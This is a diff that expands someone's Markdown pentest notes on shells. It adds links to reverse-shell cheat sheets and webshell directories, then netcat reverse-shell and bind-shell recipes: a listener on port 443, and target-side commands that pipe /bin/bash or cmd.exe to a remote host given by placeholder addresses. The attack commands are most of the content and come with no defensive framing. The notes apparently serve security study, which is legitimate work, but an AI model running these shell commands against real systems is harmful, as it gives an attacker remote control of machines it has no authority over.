@@ -1,7 +1,35 @@
-# Netcat Listener
+## Repository on Shells
+* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+* [PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+* [SecLists](https://github.com/danielmiessler/SecLists)
+* **Kali Linux** -> `/usr/share/webshells`
+* **My Parrot OS** -> `/usr/share/wordlists/SecLists/Web-Shells`
+
+<p align="left">
+    <img width="500" src="https://silviavali.github.io/assets/img/SLAE/bindreverse.png" alt="Material Bread logo">
+</p>
+# Illustrating Shells using NetCat
+## Reverse Shell
+### On the attacking machine
+```bash
+sudo nc -lvnp 443
+```
+
+### On the target
 ```bash
 nc <LOCAL-IP> <PORT> -e /bin/bash
 ```
+
+## Bind Shell
+### On the target
+```bash
+nc -lvnp <port> -e "cmd.exe"
+```
+### On the attacking machine
+```bash
+nc MACHINE_IP <port>
+```
+
 
 # Socat
 Socat is similar to Netcat. It works as a connector between two points.
